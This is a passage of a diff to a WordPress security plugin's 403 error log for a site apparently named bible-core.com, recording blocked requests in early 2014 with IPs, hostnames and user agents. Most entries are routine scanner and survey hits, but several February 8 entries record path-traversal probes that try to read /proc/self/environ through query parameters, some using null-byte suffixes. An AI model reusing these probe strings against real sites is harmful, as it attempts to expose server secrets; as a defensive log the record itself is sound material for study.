+Host Name: WIN-2VNSDRM38I7
 SERVER_PROTOCOL: HTTP/1.0
 HTTP_CLIENT_IP: 
 HTTP_FORWARDED: 
@@ -594,13 +3272,2081 @@ HTTP_X_FORWARDED_FOR:
 HTTP_X_CLUSTER_CLIENT_IP: 
 REQUEST_METHOD: GET
 HTTP_REFERER: 
-REQUEST_URI: /holybunch_prep/wp-content/uploads/2014/01/Recording_20140111_1.mp4
+REQUEST_URI: /wp-content/uploads/video/musikabend_belaja_131214.mp4
 QUERY_STRING: 
-HTTP_USER_AGENT: WordPress/3.6.1; http://localhost/holybunch_prep
+HTTP_USER_AGENT: WordPress/3.8; http://bible-core.com
 
->>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 18, 2014 - 8:04 пп <<<<<<<<<<<
-REMOTE_ADDR: ::1
-Host Name: Workier
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 24, 2014 - 5:26 дп <<<<<<<<<<<
+REMOTE_ADDR: 192.96.204.42
+Host Name: hosted-by.leaseweb.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 28, 2014 - 12:13 дп <<<<<<<<<<<
+REMOTE_ADDR: 192.96.204.42
+Host Name: hosted-by.leaseweb.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Январь 31, 2014 - 10:54 пп <<<<<<<<<<<
+REMOTE_ADDR: 192.96.204.42
+Host Name: hosted-by.leaseweb.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 4, 2014 - 1:36 пп <<<<<<<<<<<
+REMOTE_ADDR: 183.60.244.37
+Host Name: 183.60.244.37
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Opera/9.80 (X11; U; Linux i686; en-US; rv:1.9.2.3) Presto/2.2.15 Version/10.10
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 4, 2014 - 9:54 пп <<<<<<<<<<<
+REMOTE_ADDR: 192.96.204.42
+Host Name: hosted-by.leaseweb.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 5, 2014 - 6:42 дп <<<<<<<<<<<
+REMOTE_ADDR: 74.51.39.10
+Host Name: lp01.telnetcommunications.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /wp-content/plugins/akismet/readme.txt
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 5, 2014 - 6:56 пп <<<<<<<<<<<
+REMOTE_ADDR: 162.243.238.39
+Host Name: 162.243.238.39
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 5, 2014 - 6:58 пп <<<<<<<<<<<
+REMOTE_ADDR: 192.241.169.215
+Host Name: 192.241.169.215
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://www.netcraft.com/survey/
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; Netcraft Web Server Survey)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 8, 2014 - 3:06 дп <<<<<<<<<<<
+REMOTE_ADDR: 212.227.127.45
+Host Name: infong192.kundenserver.de
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /blog/oxy_content_category/video/?taxonomy=/proc/self/environ&term=childhood
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 8, 2014 - 3:06 дп <<<<<<<<<<<
+REMOTE_ADDR: 212.227.127.45
+Host Name: infong192.kundenserver.de
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /blog/oxy_content_category/video/?taxonomy=/proc/self/environ%00&term=childhood
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 8, 2014 - 3:06 дп <<<<<<<<<<<
+REMOTE_ADDR: 212.227.127.45
+Host Name: infong192.kundenserver.de
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /blog/oxy_content_category/video/?taxonomy=../../../../../../../../../../proc/self/environ&term=childhood
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 8, 2014 - 3:06 дп <<<<<<<<<<<
+REMOTE_ADDR: 212.227.127.45
+Host Name: infong192.kundenserver.de
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /blog/oxy_content_category/video/?taxonomy=/../../../../../../../../../../proc/self/environ%00&term=childhood
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 8, 2014 - 3:06 дп <<<<<<<<<<<
+REMOTE_ADDR: 212.227.127.45
+Host Name: infong192.kundenserver.de
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /blog/oxy_content_category/video/?taxonomy=teaching_topics&term=/proc/self/environ
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 8, 2014 - 3:06 дп <<<<<<<<<<<
+REMOTE_ADDR: 212.227.127.45
+Host Name: infong192.kundenserver.de
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /blog/oxy_content_category/video/?taxonomy=teaching_topics&term=/proc/self/environ%00
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 8, 2014 - 3:06 дп <<<<<<<<<<<
+REMOTE_ADDR: 212.227.127.45
+Host Name: infong192.kundenserver.de
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /blog/oxy_content_category/video/?taxonomy=teaching_topics&term=../../../../../../../../../../proc/self/environ
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 8, 2014 - 3:06 дп <<<<<<<<<<<
+REMOTE_ADDR: 212.227.127.45
+Host Name: infong192.kundenserver.de
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /blog/oxy_content_category/video/?taxonomy=teaching_topics&term=/../../../../../../../../../../proc/self/environ%00
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows; U; Windows NT 5.1; ru; rv:1.9.2.14) Gecko/20110218 Firefox/3.6.14
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 8, 2014 - 11:24 пп <<<<<<<<<<<
+REMOTE_ADDR: 192.96.204.42
+Host Name: hosted-by.leaseweb.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 11, 2014 - 3:36 пп <<<<<<<<<<<
+REMOTE_ADDR: 178.216.124.201
+Host Name: ip124-201.telenet.dn.ua
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 12, 2014 - 12:54 дп <<<<<<<<<<<
+REMOTE_ADDR: 162.243.219.120
+Host Name: 162.243.219.120
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 12, 2014 - 1:07 дп <<<<<<<<<<<
+REMOTE_ADDR: 162.243.219.120
+Host Name: 162.243.219.120
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; Netcraft SSL Server Survey - contact info@netcraft.com)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 12, 2014 - 11:39 пп <<<<<<<<<<<
+REMOTE_ADDR: 192.96.204.42
+Host Name: hosted-by.leaseweb.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 16, 2014 - 8:52 пп <<<<<<<<<<<
+REMOTE_ADDR: 192.96.204.42
+Host Name: hosted-by.leaseweb.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 20, 2014 - 7:15 пп <<<<<<<<<<<
+REMOTE_ADDR: 192.96.204.42
+Host Name: hosted-by.leaseweb.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 21, 2014 - 10:30 дп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 21, 2014 - 3:30 пп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 22, 2014 - 4:40 пп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 22, 2014 - 6:43 пп <<<<<<<<<<<
+REMOTE_ADDR: 178.216.124.201
+Host Name: ip124-201.telenet.dn.ua
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /phpBB2
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/4.0 (compatible; MSIE 7.0; AOL 8.0; Windows NT 5.1; .NET CLR 2.0.50727; .NET CLR 1.1.4322; .NET CLR 3.0.04506.30)
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 23, 2014 - 7:26 пп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 24, 2014 - 10:39 дп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 24, 2014 - 12:11 пп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 24, 2014 - 2:40 пп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 24, 2014 - 3:24 пп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 24, 2014 - 4:02 пп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 24, 2014 - 4:40 пп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 24, 2014 - 5:32 пп <<<<<<<<<<<
+REMOTE_ADDR: 192.96.204.42
+Host Name: hosted-by.leaseweb.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: http://domainsigma.com/whois/bible-core.com
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: Mozilla/5.0 (Windows NT 5.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/31.0.1650.16 Safari/537.36
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 25, 2014 - 6:35 дп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 25, 2014 - 6:55 дп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 25, 2014 - 10:17 дп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 25, 2014 - 11:29 дп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 25, 2014 - 1:10 пп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 25, 2014 - 1:46 пп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 25, 2014 - 2:37 пп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 25, 2014 - 6:43 пп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 25, 2014 - 7:40 пп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 25, 2014 - 8:36 пп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 26, 2014 - 5:49 дп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
+SERVER_PROTOCOL: HTTP/1.1
+HTTP_CLIENT_IP: 
+HTTP_FORWARDED: 
+HTTP_X_FORWARDED_FOR: 
+HTTP_X_CLUSTER_CLIENT_IP: 
+REQUEST_METHOD: GET
+HTTP_REFERER: 
+REQUEST_URI: /
+QUERY_STRING: 
+HTTP_USER_AGENT: 
+
+>>>>>>>>>>> 403 GET or Other Request Error Logged - Февраль 26, 2014 - 6:30 дп <<<<<<<<<<<
+REMOTE_ADDR: 69.61.47.114
+Host Name: um-2043.cyberwurx.com
